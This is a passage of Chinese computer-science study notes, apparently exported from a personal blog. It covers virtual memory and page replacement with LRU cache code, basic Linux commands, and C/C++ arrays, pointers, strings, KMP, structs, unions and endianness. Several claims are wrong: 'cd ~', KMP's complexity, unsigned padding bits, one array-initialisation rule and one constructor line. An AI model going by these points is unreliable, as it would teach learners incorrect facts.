地址变换机构，逻辑地址到物理地址的变换。 段页式虚拟存储器 基本思想是对用户原来编写程序的虚拟存储空间采用分段的方法管理，而对主存储器的物理空间采用分页的方法管理。段页式虚拟存储器一方面具有段式虚拟存储器的主要优点。例如，用户程序可以模块化编写，程序段的共享和信息的保护都比较方便，程序可以在执行时再动态链接等。另一方面也具有页式虚拟存储器的主要优点。例如：主存储器的利用率比较高，对辅助存储器的管理比较容易等。 请求分页管理方式运行作业时不需要把作业的所有页面都装入内存才能运行，需要哪一页就请求哪一页。 请求分页系统建立在基本分页系统基础之上，为了支持虚拟存储器功能而增加了请求调页功能和页面置换功能。请求分页是目前最常用的一种实现虚拟存储器的方法。 在请求分页系统中，只要求将当前需要的一部分页面装入内存，便可以启动作业运行。在作业执行过程中，当所要访问的页面不在内存时，再通过调页功能将其调入，同时还可以通过置换功能将暂时不用的页面换出到外存上，以便腾出内存空间。 为了实现请求分页，系统必须提供一定的硬件支持。 除了需要一定容量的内存及外存的计算机系统，还需要有页表机制、缺页中断机构和地址变换机构。 常见的置换算法有以下三种：最佳置换算法、先进先出(FIFO)页面置换算法、最近最久未使用(LRU)置换算法。 最佳置换算法(OPT) 最佳(Optimal, OPT)置换算法所选择的被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面，这样可以保证获得最低的缺页率。但由于人们目前无法预知进程在内存下的若干页面中哪个是未来最长时间内不再被访问的，因而该算法无法实现。最佳置换算法可以用来评价其他算法。 先进先出（FIFO）页面置换算法 优先淘汰最早进入内存的页面，亦即在内存中驻留时间最久的页面。该算法实现简单，只需把调入内存的页面根据先后次序链接成队列，设置一个指针总指向最早的页面。但该算法与进程实际运行时的规律不适应，因为在进程中，有的页面经常被访问。 FIFO算法还会产生当所分配的物理块数增大而页故障数不减反增的异常现象，这是由Belady于1969年发现，故称为Belady异常，如图2-3所示。FIFO算法可能出现Belady异常，而LRU和OPT算法永远不会出现Belady异常。 最近最久未使用（LRU）置换算法 选择最近最长时间未访问过的页面予以淘汰，它认为过去一-段时间内未访问过的页面， 在最近的将来可能也不会被访问。该算法为每个页面设置一个访问字段，来记录页面自上次被访问以来所经历的时间，淘汰页面时选择现有页面中值最大的予以淘汰。 LRU性能较好，但需要寄存器和栈的硬件支持。LRU是堆栈类的算法。理论上可以证明，堆栈类算法不可能出现Belady异常。FIFO 算法基于队列实现，不是堆栈类算法。 &#x3D;&#x3D;手写LRU&#x3D;&#x3D; C++实现：https://blog.csdn.net/Appleeatingboy/article/details/118306037 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/*使用双向链表 + 哈希表 实现*/class LRUCache &#123;public: class Node&#123; public: int key; int val; Node* pre; Node* next; Node()&#123;&#125; Node(int mkey, int mvalue):key(mkey),val(mvalue),pre(NULL),next(NULL)&#123; &#125; &#125;; //构造函数 LRUCache(int capacity) &#123; this-&gt;size = capacity; //头尾保护节点 head = new Node(); tail = new Node(); //初始化双链表关系 head-&gt;next = tail; tail-&gt;pre = head; &#125; Node* delete_currentnode(Node* current)&#123; current-&gt;pre-&gt;next = current-&gt;next; current-&gt;next-&gt;pre = current-&gt;pre; return current; &#125; //移动到最前面 //相当于在链表中一个insert操作，在head 和 head的next之间插入一个节点 void move_to_head(Node* current)&#123; Node* next = head-&gt;next; head-&gt;next = current; current-&gt;pre = head; next-&gt;pre = current; current-&gt;next = next; &#125; void make_recently(Node* current)&#123; Node* temp = delete_currentnode(current); move_to_head(temp); &#125; int get(int key) &#123; int ret = -1; //get 到key的value,要进行将key的对值从存储结构中删除，然后重新排列前后的数据 if(map.find(key)!= map.end())&#123; Node* temp = map[key]; make_recently(temp); ret = temp-&gt;val; &#125; return ret; &#125; void put(int key, int value) &#123; if(map.find(key) != map.end())&#123; //关键字存在，修改key,对应的值 Node* temp = map[key]; temp-&gt;val= value; //将key变为最近使用 make_recently(temp); &#125; else&#123; //关键字不存在，插入,(key,value) Node* cur = new Node(key,value); if( map.size()==size )&#123; //链表尾部就是最久未使用的key Node* temp = delete_currentnode(tail-&gt;pre); map.erase(temp-&gt;key); &#125; move_to_head(cur); map[key] = cur; &#125; &#125; public: //类内共享容量值 int size; unordered_map&lt;int, Node*&gt; map; Node* head; Node* tail; 用 Java 的内置类型 LinkedHashMap 来实现 LRU 算法：https://blog.csdn.net/lwb102063/article/details/114085191 1234567891011121314151617181920212223242526272829303132333435363738394041class LRUCache &#123; int cap; LinkedHashMap&lt;Integer, Integer&gt; cache = new LinkedHashMap&lt;&gt;(); public LRUCache(int capacity) &#123; this.cap = capacity; &#125; public int get(int key) &#123; if (!cache.containsKey(key)) &#123; return -1; &#125; // 将 key 变为最近使用 makeRecently(key); return cache.get(key); &#125; public void put(int key, int val) &#123; if (cache.containsKey(key)) &#123; // 修改 key 的值 cache.put(key, val); // 将 key 变为最近使用 makeRecently(key); return; &#125; if (cache.size() &gt;= this.cap) &#123; // 链表头部就是最久未使用的 key int oldestKey = cache.keySet().iterator().next(); cache.remove(oldestKey); &#125; // 将新的 key 添加链表尾部 cache.put(key, val); &#125; private void makeRecently(int key) &#123; int val = cache.get(key); // 删除 key，重新插入到队尾 cache.remove(key); cache.put(key, val); &#125;&#125; LFU（Least Frequently Used）算法 根据数据的历史访问频率来淘汰数据，其核心思想是“如果数据过去被访问多次，那么将来被访问的频率也更高”。LFU的每个数据块都有一个引用计数，所有数据块按照引用计数排序，具有相同引用计数的数据块则按照时间排序。 抖动内存抖动：非常频繁的换页活动； 系统中的“颠簸”是由缺页率高引起的，与内存容量、交换信息量无直接关系。 在页面置换过程中的一种最糟糕的情形是，刚刚换出的页面马上又要换入主存，刚刚换入的页面马上就要换出主存，这种**频繁的页面调度行为称为抖动，或颠簸。如果一个进程在换页上用的时间多于执行时间，那么这个进程就在颠簸**。频繁的发生缺页中断，其主要原因是某个进程频繁访问的页面数目高于可用的物理页帧数目。虚拟内存技术可以在内存中保留更多的进程以提高系统效率。但系统必须很“聪明”地管理页面分配方案。在稳定状态，几乎主存的所有空间都被进程块占据，处理机和操作系统可以直接访问到尽可能多的进程。但如果管理不当，处理机的大部分时间都将用于交换块，即请求调入页面的操作，而不是执行进程的指令，这就会大大降低系统效率。 工作集工作集(或驻留集)是指在某段时间间隔内，进程要访问的页面集合。经常被使用的页面需要在工作集中，而长期不被使用的页面要从工作集中被丢弃。为了防止系统出现抖动现象，需要选择合适的工作集大小。 工作集模型的原理是：让操作系统跟踪每个进程的工作集，并为进程分配大于其工作集的物理块。如果还有空闲物理块，则可以再调一个 进程到内存以增加多道程序数。如果所有工作集之和增加以至于超过了可用物理块的总数，那么操作系统会暂停一个进程， 将其页面调出并且将其物理块分配给其他进程，防止出现抖动现象。 正确选择:工作集的大小，对存储器的利用率和系统吞吐量的提高，都将产生重要影响。 Linux常用命令目录和文件的相关操作1234cd /home # 变换工作目录cd . # 代表当前目录cd .. # 代表上一层目录cd ~ # 代表前一个工作目录 1pwd # 输出当前工作目录 12mkdir /test # 新建单层目录mkdir -p /test/testing # 新建多层目录 123rmdir # 只能用来删除空目录rm -r test # 删除目录时需要使用&quot;-r&quot;选项，删除非空目录rm aaa # 默认仅删除文件 1ls 12cp ./aaa /tmp/bbb # 将当前目录下的aaa文件复制到tmp下并更名为bbbcp -r /etc /tmp # 复制目录时需要使用&quot;-r&quot;选项，如复制/etc/目录下的所有内容到/tmp下 1mv /home/test /home/test2 # 移动或更名现有的文件或目录 文本文件内容查看cat：由第一行开始查看文件。cat 是Concatenate (连续)的简写，主要的功能是将-一个文件的内容连续输出在屏幕上。 1cat ./aaa tac：从最后一行开始显示，可以看出cat与tac是倒置的。cat 是由第一行到最后一行连续显示在屏幕上，而tac则是由最后一行到第一行反向在屏幕上显示出来。 1tac ./aaa nl：显示文件内容的时候，一起显示文件行号。 1nl ./aaa more、less：一页一页显示文件内容。前面提到的nl、cat、 tac等，都是一次性将数据显示到屏幕上面，若是文件行数很多，前面的内容就会看不到，这时就需要使用more与less来一页一页查看文件内容。命令如下: 12more ./aaa # 向后翻页less ./aaa # 向前翻页 head：head命令查看文本文件时，只显示头几行。用法如下： 1head -n number 文件名 # 只显示文件的前number行 -n选项后面的参数number如果是负数，代表列出前面的所有行数，但不包括后面number行。如&#x2F;etc&#x2F;man.config 共有141行，则head -n -100 /etc/man. config就会列出前面41行，后面100行不会打印出来了。 tail：tail命令查看文本文件时，只显示尾几行。用法如下： 1tail -n number 文件名 当number前面有“+”号时，与head -n -xx有异曲同工之妙。如tail -n +100 /etc/man.config代表该文件从100行以后都会被列出来，同样，在man.config共有141行，因此第100~141行就会被列出来，前面的99行都不会被显示出来。 touch：建立一个空文件。 1touch aaa grep：分析一行信息，若当中有需要的信息，就将该行显示出来。常用在管道中。例如将文件aaa中包含”root”的行的内容显示出来的命令为cat aaa | grep &quot;root&quot;或者grep &quot;root&quot; aaa。当使用grep -E表示后面跟着的是延申型正则表达式，等价于”egrep”。比如找到文件try_ grep含有以a字母为行开头的内容，可以使用grep -E ^a try_grep。^M表示以M开头的行，M$表示以M结尾的行。 123cat aaa | grep &quot;root&quot; # 文件aaa中包含&quot;root&quot;的行的内容grep &quot;root&quot; aaa # 与上一行作用相同grep -E ^a try_grep # 查看系统信息df：列出文件系统的整体磁盘使用量。 ps：将某个时间点的程序运行情况显示出来。 top：动态观察程序变化，持续侦测程序运行状态。","raw":null,"content":null,"categories":[],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"C/C++ 基础知识","slug":"计算机基础/1. C_C++","date":"2021-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.708Z","comments":true,"path":"posts/[object Object]/计算机基础/1. C_C++/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1.%20C_C++/undefined","excerpt":"","text":"C&#x2F;C++[TOC] 1. 数组一维数组可以用于实现线性表的顺序存储、哈希表等，二维数组可用来保存图的邻接矩阵等。 没有引用数组，但数组可以有引用。 有指针数组和数组指针。 1.1 一维数组初始化在函数体外定义的内置类型数组（全局数组），元素会被初始化为0； 在函数体外定义的内置类型数组，元素不会被初始化。但是若初始化了部分元素，其后的元素也会被初始化为0； 若不是内置类型，不管在何处定义，均调用其默认构造函数为其初始化。若无默认构造函数，则报错。 1234int x[4]=&#123;0&#125;; //&#123;0,0,0,0&#125;int y[4]=&#123;1&#125;; //&#123;1,0,0,0&#125;int* a=new int[n]; //大小未知时使用new动态声明delete []a; //使用完毕后释放内存空间,[]a表示释放a所指数组的内存，如果a是类对象，分别调用每个数组元素a[i]的析构函数 C风格字符串 字符串常量 以双引号括起的字符序列，且C++中**均在末尾自动添加一个空字符’\\0’**。注意’A’表示单个字符，”A”表示字符串常量，其表示A和\\0两个字符。 字符数组 可以使用{}初始化（**最后一个元素必须为空字符’\\0’**，以其作为字符串结束标志），也可以使用双引号括起的字符串初始化（自动在末尾添加’\\0’）。 12345char ca1[]=&#123;&#x27;C&#x27;,&#x27;+&#x27;,&#x27;+&#x27;&#125;; //不是C风格字符串，末尾没有&#x27;\\0&#x27;char ca2[]=&#123;&#x27;C&#x27;,&#x27;+&#x27;,&#x27;+&#x27;,&#x27;\\0&#x27;&#125;; //是C风格字符串，长度为4char ca3[]=&quot;C++&quot;; //是C风格字符串，末尾自动添加&#x27;\\0&#x27;，长度为4char *cp2=ca2; //是C风格字符串const char ch3[6]=&quot;Daniel&quot;; //报错，因为字符串&quot;Daniel&quot;末尾其实还有一个空字符，长度为7而不是6 注意：使用C风格字符串的标准库函数时，牢记参数必须以空字符’\\0’结束。 若一char数组变量的末尾没有’\\0’，但是又使用了C风格字符串的标准库函数（比如strcpy、strcat，strlen）进行处理，那么程序就会在该变量的内存空间中一直寻找空字符’\\0’，直到恰好遇到为止，导致程序出错。 1.2 二维数组初始化 按行初始化：使用两层花括号初始化，每一个花括号代表一行。 顺序初始化：使用一个花括号初始化，逐行填入，缺少的默认初始化为0。 C++在声明和初始化二维数组时，若对所有元素都赋值，可以省略第一维。但声明更高维数组时，最多也只能省略第一维。 12345678int ia[2][4]=&#123; &#123;0,1,2,3&#125;, &#123;4,5,6,7&#125;&#125;;int ia[2][4]=&#123;0,1,2,3,4,5,6,7&#125;; // 逐行填入，缺少的默认初始化为0int ia[2][4]=&#123;&#123;0&#125;,&#123;4&#125;&#125;; // 部分初始化，每行缺少的默认初始化为0int a[2][4] = &#123;0,3,6&#125;; // &#123;0，3，6，0，0，0，0，0&#125;int ia[][3]=&#123;0,1,2,3,4,5&#125; //初始化所有元素时，可以省略第一维 C&#x2F;C++中二维数组按照行优先顺序存储，所以二维数组a在内存空间中的地址顺序b有如下关系：a[x][y] = b[x*列数+y] 。 1234#define M 3#define N 4int a[M][N] = &#123;&#123;1,2,3,4&#125;, &#123;5,6,7,8&#125;, &#123;9,10,11,12&#125;&#125;;p = &amp;a[0][0]; a[i][j]就等于*(p+i*N+j) 另外由于是行优先顺序存储，所以a[1][5]也不会报错，会直接顺延到下一行，指向值10。 动态声明 1234567int **a = new int* [m]; // m行for(int i=0; i&lt;m; i++) a[i] = new int [n]; // n列// 手动动态声明的数组需要手动释放内存for(int i=0;i&lt;m;i++) delete []a[i];delete []a; 1.3 指针指针运算在C&#x2F;C++中，指针虽然经常被当作整数来处理，但是其支持的操作非常有限，合法的运算包括：指针与整数的加减、同类型指针的比较、同类型两指针相减。 当指针与一个整数量进行算数运算时，整数在执行加法运算前始终会根据合适的大小进行调整（相乘）。比如，字符指针加1，则运算结果产生的指针指向内存中的下一个字符（整数量乘1）；如果指针指向float类型的变量，由于float类型占据4个字节，所以指针加1时实际加到指针上的整型值为4（整数量乘4），即增加一个float大小。所以指针的大小与所指变量类型相关，其运算中指针增加的值也与这个类型相关。 指针的算数运算 C的指针的算术运算只局限于两种形式。第-种形式是: 指针+ &#x2F; - 整数。这种形式用于指向数组中某个元素的指针。 第二种类型的指针运算具有如下的形式: 指针-指针。只有当两个指针都指向同一个数组中的元素时，才允许从一个指针减去另一个指针。减法运算的值是两个指针在内存中的距离(以数组元素的长度为单位，而不是以字节为单位)。即相差多少个元素就是多少。 如果两个指针所指向的不是同一个数组中的元素，那么它们之间相减的结果是未定义的。程序员无从知道两个数组在内存中的相对位置，如果不知道这一点， 两个指针之间的距离就毫无意义。 指针的关系运算 还可以进行&lt;、&lt;&#x3D;、&gt;、&gt; &#x3D;运算，不过前提是它们都指向同-个数组中的元素。根据你所使用的操作符，比较表达式将告诉你哪个指针指向数组中更前或更后的元素。 指针数组与数组指针 指针数组：由指针作为元素组成的数组。定义：int* a[10] 数组指针：一个指向数组的指针。定义：int (*p)[10]为指向有10个元素的整形数组的指针，因为[]的优先级高于，所以要有括号，用[10]表示*p指向的数组有10个元素。*数组指针运算时以一整个数组大小为单位。 对于二维数组int w[3][4]，定义一个与w等价的数组指针：int (*pw)[4] = w; 123456char a[]=&quot;hello&quot;;a[0] = &#x27;x&#x27;; // 变成xellochar* q=a;q[0]=&#x27;b&#x27;; // 变成bellochar *p=&quot;hello&quot;; // 把存放该字符串的首地址装入指针变量p[0]=&#x27;x&#x27;; // 该语句错误 最后一个语句错误。a是数组，内存分配在栈上，故可以通过数组名或指向数组的指针进行修改，而p指向的是位于文字常量区的字符串，是不允许被修改的，故通过指针修改错误。但使用p[0]访问相应元素是正确的，只是不能修改。 指针和数组密切相关。特别是在表达式中使用数组名时，该名字会自动转换为指向数组首元素(第0元素)的指针。但是注意数组的首地址是常量，不可以进行赋值操作。 12345678int ia[]=&#123;0, 2, 4, 6, 8&#125;;ia += 1; // 编译错误，数组首地址ia为常量，不可变更；可以使用char* p=a; p+=2;实现int *ip=ia;// 修改第四个元素为9，可使用如下操作：ia[4]=9;*(ia+4)=9;ip[4]=9;*(ip+4)=9; 注意：对于int a[10];来说，&amp;a[0]等价于a，为指向数组首元素的指针，每加1就跳过4个字节（int类型）。而&amp;a为指向数组的指针，与a的类型不同（&amp;a的类型为int(*)[10]），但是指向的单元相同。 例题： 在二维数组int a[4][5]中，同理，其可以看成由4个数组作为元素组成的数组。那么a的第一个元素为数组a[0]，然后是数组a[1]、a[2]、a[3]，a表示指向数组首元素a[0]的指针，即数组指针。而a[0]本身为包含5个元素的数组，所以a[0]表示指向数组a[0]首元素a[0][0]的指针。 因此： &amp;a：类型为整个二维数组的数组指针，int(*)[4][5]。&amp;a[0]等价于a，&amp;a+1直接跳到二维数组末尾。 a：类型为int(*)[5]，为a的第一个数组元素的数组指针。且a为常量，不可以进行赋值运算。a+i指向a[i]，a加1将直接跳过5个元素，即*(a+1)相当于a[i]。 ***a或a[0]*：类型为int，指针，指向数组a[0]的首元素a[0][0]。 ***(a+1)或a[1]**：指向数组a[1]首元素a[1][0]的指针。 *(*(a+1)+2）：为数组a[1]的第二个元素a[1][2]. 例题： 1.4 数组的应用 线性表的顺序存储 线性表是一种逻辑结构，线性表的顺序存储成为顺序表。 **注意**：线性表中元素的位序是从1开始的，而数组元素下标是从0开始的。 时间复杂度： 存取访问：通过首地址和元素序号可以在O(1)内找到指定元素。 插入：表尾插入O(1)，表头插入O(n)。平均复杂度O(n)。 删除：表尾插入O(1)，表头插入O(n)。平均复杂度O(n)。 按值查找：目标就在表头O(1)，目标在表尾O(n)。平均复杂度O(n)。 2. 字符串2.1 基础操作子串：串种任意个连续字符组成的子序列。字符串本身以及空串也属于字符串的子串。 子序列：不要求字符连续，但是顺序与其在主串中相一致。 以整数格式%d输出字符时，’\\0’会输出0，其他字符会输出相应的ascii码的十进制。因此可以以while(*str)来判断是否到达字符串末尾。 strlen(s) 返回s的长度，以’\\0’作为结束标志，但是不包括字符串结束符null strcmp(s1,s2) 比较两个字符串是否相同。两个字符串自左向右逐个字符比较（ASCII），直到出现不同的字符或遇到’\\0’为止。若相等，则返回0；若s1大于s2，则返回正数；若s1小于s2，则返回负数；字符串比较不能用if(s1==s2)，该语句比较的是首地址，而不是内容。 strcat(s1,s2) 将字符串s2连接到s1之后，并返回s1。覆盖s1末尾的’\\0’，且s1处必须要有足够的空间存放新生成的字符串。 strcpy(s1,s2) 将s2复制给s1，并返回s1。复制的内容到’\\0’结束，处理不好容易溢出。 strncat(s1,s2,n) 将s2的前n个字符连接到s1后面，并返回s1 strncpy(s1,s2,n) 将s2的前n个字符复制给s1，并返回s1 **memcpy(void *dest, void *src, size_t n)**：从源src所指内存地址的起始位置拷贝n个字节到目标dest所指的内存地址的起始位置。必须指定拷贝长度n，且可用于各种数据类型，而strcpy仅用于字符串。 **memset(void *s, int ch, size_t n)**：将s中前n个字节用ch替换并返回s，作用是在一段内存中填充某个给定的值，它是对较大的结构体或数组进行清零操作的一种最快方法。 2.2 字符串包含问题串的模式匹配算法KMP Brute Force算法 时间复杂度O(mn) KMP算法 https://www.bilibili.com/video/BV1AY4y157yL?spm_id_from=333.337.search-card.all.click&amp;vd_source=854e3e80724343215a332be36ec7cf83 时间复杂度O(mn) KMP算法每当一趟匹配过程中出现字符比较不等时，不需回溯主串（主串的指针一直向后移动，不回退），而是利用已经得到的“部分匹配”结果将模式串向右“滑动”尽可能远的一段距离后，继续进行比较，且此时并不一定是拿模式串的第一位继续比较。 next数组的作用：当匹配失败时，查看最后一个匹配成功的字符所对应的next数值。下次匹配时，在模式串中跳过前next个字符继续比对 1234567891011121314int kmp_search(const char* src, int slen, const char* patn, int plen, const int* nextval, int pos)&#123; // nextval数组已知 int i=pos; // 主串的指针 int j=0; // 子串的指针 while(i&lt;slen &amp;&amp; j&lt;plen)&#123; // i永远递增 if(j==-1 || src[i]==patn[j])&#123;++i;++j;&#125; // 该字符匹配，指针后移 else&#123; //匹配失败时直接使用patn[nextval[j]]与s[i]继续比较，即跳过模式串中的nextval[j]个字符 j=nextval[j]; &#125; &#125; if(j&gt;=plen) return i-plen; //返回匹配成功的子串开头 else return -1; //匹配失败&#125; 下面给出计算nextval数组的函数： 思想：在匹配成功的那段模式串中寻找最长的相同前后缀，这个长度就是nextval。那么对于匹配成功的那部分字符串，模式串的前缀就可以匹配到主串的后缀，所以可以跳过nextval个字符。 这个最长的相同前后缀不包括匹配成功的部分模式串本身。 12345678910111213141516171819void get_nextval(char const* ptrn, int plen, int* nextval)&#123; int i=0; nextval[0]=-1; // 第0位前面没有字符串，也无法找最长相同前后缀，所以初始化为-1 int k=-1; // K记录字符i之前的字符串中最长相同前后缀的位置，就是next[i] while(i&lt;plen-1)&#123; // 判断1：确定最长相同前后缀长度 if(k==-1 || ptrn[i] == ptrn[k])&#123; // 相等时k加1，即在前一位字符的k上加1得到目前的字符的k ++i; ++k; // 判断2：如何给nextval[i]赋值 if(ptrn[i] != ptrn[k]) // i、k位置的字符是否相同，不相同，nextval[i]就等于k，下次与主串继续比较k处的字符，而不是从模式串开头开始 nextval[i]=k; else nextval[i]=nextval[k]; // 相同的话，因为i和k处的字符相等，主串接着比较k处的字符依然是不相等的，所以改为继续比较nextval[k]处的字符 &#125; else k=nextval[k]; //不相等时k回退，直到找到k处的字符与i处相等或者k=-1 // 改为判断i、nextval[k]位置的字符是否相等，即查看相同前缀的前缀，继续判断（相同前缀的前缀等于相同后缀的后缀），直到k=-1（不存在任何相同的前后缀） &#125;&#125; 以模式串char *ptrn = “ABABC&quot;为例，nextval数组下标为0到4。 对于ptrn[0]来说，不存在更短的前后缀，所以nextval[0]直接为-1； 接着对于ptrn[1]之前的字符串”A“，此时k&#x3D;-1，所以进入判断1，k和i加1，k&#x3D;0，i&#x3D;1，由于ptrn[1] !&#x3D; ptrn[0]，所以nextval[1]为k，为0；与ptrn[1]的’B’不匹配，而ptrn[0]与ptrn[1]不相等，所以可以右滑到与ptrn[0]的’A’继续匹配； 接着对于ptrn[2]之前的字符串”AB“，此时k&#x3D;0，ptrn[1] !&#x3D; ptrn[0]，所以进入判断1，k回退为nextval[0]，为-1，接着继续判断1，k和i加1，k&#x3D;0（最长相同前后缀的长度），i&#x3D;2，ptrn[2] &#x3D;&#x3D; ptrn[0]，所以nextval[2]为nextval[0]，为-1；与ptrn[2]的’A’不匹配，那右滑到ptrn[0]的’A’也是仍然不匹配的，所以nextval[2]为-1； 对于ptrn[3]之前的字符串”ABA“，此时k&#x3D;0，ptrn[2] &#x3D;&#x3D; ptrn[0]，所以进入判断1，k和i加1，k&#x3D;1（最长相同前后缀的长度），i&#x3D;3，由于ptrn[3] &#x3D;&#x3D; ptrn[1]，nextval[3]为nextval[1]，为0；与ptrn[3]的’B’不匹配，那右滑到ptrn[1]的’B’也是仍然不匹配的，所以nextval[3]为0； 对于ptrn[4]之前的字符串”ABAB“，此时k&#x3D;1，ptrn[3] &#x3D;&#x3D; ptrn[1]，所以进入判断1，k和i加1，k&#x3D;2（最长相同前后缀的长度），i&#x3D;4，ptrn[4] !&#x3D; ptrn[2]，所以nextval[3]为k，为2。与ptrn[4]的’C’不匹配，那右滑到ptrn[2]的’A’继续匹配的； 字符串移位包含问题假设有一个函数 isSubstring, 其功能是判断一个字符串是不是另外一个字符串的子串。现在给你两个字符串s1与s2,请仅使用isSubstring函数判断s2是否能够被s1做循环移位得到的字符串包含。解答思想是:如果字符串s1的长度小于s2的长度，则返回0; .否则，连接s1与其自身得到新字符串sls1,然后判断s2是否是sIsl的子串，若是返回1,若不是返回0。 2.3 字符串转数字将字符串的字符逐个转为数字（*digit - &#39;0&#39;），乘以10然后加上下一个字符表示的数字。 另外还需要考虑特殊字符，比如首字符是否为’+’或者’-‘，是否包含非法字符，最后要以’\\0’结束。以及中间结果是否大于上限std: :numeric_ limits&lt;int&gt;: :max()。 **大数乘法**： 2.4 其他问题 字符串中的单词逆转：使用指针交换字符 在主串中删除模式串中出现的字符： 遍历；也可以给每个字母分配一个素数，从2开始，以此类推。这样a将会是2, b将会是3, c将会是5,等等，然后得出模式串的乘积multi, 现在遍历字符串s，把每个字母代表的素数除multi, 若能整除，则将其删除。 删除字符串开头和末尾的空格，并将中间的连续空格转化为1个 在字符串中找到第一个只出现一次的字符：使用数组实现的hash表即可，下标存放ascii码值（char可以直接作为整数处理），元素存放出现次数。在第二次遍历时，取首个为1的元素即可。 判断字符串中所有字符都不相同：同样使用hash表即可，值统一为True。若出现一个字符在hash表中存在，则表明该字符重复。 3. 结构体、共用体和枚举与数组的不同： 结构体可以在一个结构中声明不同的数据类型；相同结构的结构体变量可以相互赋值。 与class的不同： class的成员访问权限默认为private，而struct成员的访问权限默认为public。 3.1 结构体的定义不允许结构体本身的递归定义，但可以使用指针指向本类型。 结构体定义中可以包含另外的结构体，即可以嵌套。 12345678910struct Books&#123; char title[50]; char author[50]; char subject[100]; int book_id; struct person *per; // 指向本类型的指针&#125; book; // 同时声明一个结构体Books的变量bookstruct Books book; // 声明一个结构体变量book 12345struct person&#123; char name [20]; char sex; person(char a[20], char b) :name(a), sex(b)(a)&#123;&#125; // 构造函数&#125;boy1=&#123;&quot;zhangbing&quot;,&#x27;M&#x27;&#125;; // 结构体变量可以在定义时初始化赋值 在对结构体变量初始化时，应将各成员所赋初值依照结构体类型说明中成员的顺序依次放在一对大括号中，不允许跳过前面的成员给后面的成员赋值，但可以只给前面若干成员赋初值，后面未赋初值的成员中，数值型和字符型的数据，系统自动赋值零。 123456789//也可以用typedef创建新类型Simpletypedef struct&#123; int a; char b; double c; &#125; Simple;//现在可以用Simple作为类型声明新的结构体变量Simple u1, u2[20], *u3; 3.2 结构体中的位字段C&#x2F;C++允许指定占用特定位数的数据成员，声明时，位字段的类型为整型或枚举，然后是冒号和指定位数的数字，如下： 1234struct reg&#123; unsigned int a:1; // 占1位 unsigned int b:4; // 占4位，4bits&#125;; 3.3 共用体结构体和共用体都是由多个不同的数据类型成员组成，但在任何同一时刻，共用体中只存放了一个被选中的成员，而结构体的所有成员都存在。对于共用体的不同成员赋值，将会对其他成员重写，原来成员的值就不存在了，而对于结构体的不同成员赋值是互不影响的。 结构体占用内存，可能超过各成员内存量总和；共用体占用内存为各成员中占用最大者内存。 共用体的用途之一是当数据项使用两种或更多种格式（但不会同时使用）时，可节省空间。 union成员从低地址开始存放。 1234567891011121314// Intel X86上运行一下程序int main(int argc, char *argv[]) &#123; union&#123; struct &#123; unsigned short s1:3; unsigned short s2:3; unsigned short s3:2; &#125;x; char C; &#125;V; v.c=103; cout&lt;&lt;v.x.s1&lt;&lt;endl; return 0;&#125; 由于Intel X86是小端模式，103转为二进制为01100111，所以高地址到低地址的内存空间为01100111。而union成员都是从低地址开始存放，故分别分配给s1低地址的111，然后是s2的100，最后是s3的高地址的01。 3.4 大小端存储字节序大端存储格式：字数据的高字节存储在低地址中，而字数据的低字节则存放在高地址中； 小端存储格式：低地址中存放的是字数据的低字节，高地址存放的是字数据的高字节。 注意: printf 函数是最右侧的元素先入栈。若入栈元素为char（占1个字节）、short（占2个字节） 等小于4个字节的类型，入栈时也占4个字节。这里的一个关键点是: char、 short 等类型入栈时由于入栈字节数为4，比它们实际占用的内存数要多，那么高位是补0还是补1呢?当数是无符号类型时（如unsigned short），高位总是补1，当数是有符号类型时（如short），高位补符号位。 例题： array数组后4个元素默认初始化为0x00。printf的输出从右到左先依次入栈，输出时依次出栈。首先pint为int类型的指针，所以运算时4个字节一个单位，*(pint+2)的值为0x00000000。pint64为long long类型指针，运算时8个字节一个单位，又系统为小端，低位在低地址字节，所以*pint64为0x0807060504030201。pshort为short类型指针，运算时2个字节一个单位，所以*(pshort+2)为0x0605，由于入栈时不足4个字节，所以高位补0，得到0x00000605。这些值依次入栈得到如下栈空间（高位先入栈）： 位序在字节内部也存在大小端问题（对于位字段&#x2F;位数据），相应的大小端定义为： 第一步：将位字段组成的字节，低字节存放在低地址，高字节存放在高地址； 第二步：然后按照大小端格式的定义在每个字节中分配位地址： 大端存储格式：首先将位数据的高位存储在字节的高位中，之后低位数据存放在低位中。 小端存储格式：首先将位数据的低位存储在字节的低位中，之后高位数据存放在高位中。 注意：若位数据（如short in a:9）大于1个字节，则先在位数据组成的字节序中，先按字节序中的大小端的定义分配相应大小的位数据到相应的字节中（此过程位数据可能被拆分到不同字节中），然后再在每个字节中，按位序大小端的定义分配到相应的位地址。 1234567891011121314struct Test&#123; unsigned short a:5; unsigned short b:5; unsigned short c:6;&#125;;int main(int argc, char**)&#123; Test t; t.a=16; t.b=4; t.c=0; short i = *(short*)&amp;t; cout&lt;&lt;i; return ;&#125; 在上述代码中，结构体表示的是由a，b，c三个位字段组成的两个字节，a是高位域员，c是低位域员。 在大端存储格式中，优先将位数据的高位存储在字节的高位中，所以5位的a（10000）和b的三位高位（001）分配到高位字节，剩下的2位b（00）和6位c（000000）分配到低位字节，因此高位字节的位序为[10000][001]，低位字节位序为[00][000000]； 在小端存储格式中，优先将位数据的低位存储在字节的低位中，所以5位a（10000）和b的三位低位（100）分配到高位字节，b的两位高位（00）和6位c（000000）分配到低位字节，因此高位字节的位序为[100][10000]，低位字节位序为[000000][00]； 因此，上述代码中t所在内存为：10010000 00000000，由于时小端存储，所以转换为十六进制为0x0090，所以输出应该为144。 3.5 枚举C++的enum工具提供了另一种创建符号常量的方式，可以用于代替const。语句如下： 1enum 枚举类型名&#123;枚举常量1[=整形常数], 枚举常量2[=整形常数], …&#125;[变量名列表] 花括号的内容称为枚举表，包含多个枚举常量，声明时可以为其赋初值。若不赋初值，编译器会为每一个枚举常量赋一个不同的整型值，第一个为0，第二个为1等。当枚举表中某个常量赋值后，其后的成员则按依次加1的规则确定其值。 1234int main (void) &#123; enum&#123;a, b=5，c, d=4, e&#125;; // a为0,c为6,e为5 enum&#123;h, x, v=120，w, r=99, s&#125;; // h为0,x为1，w为121,s为100return 0; 3.6 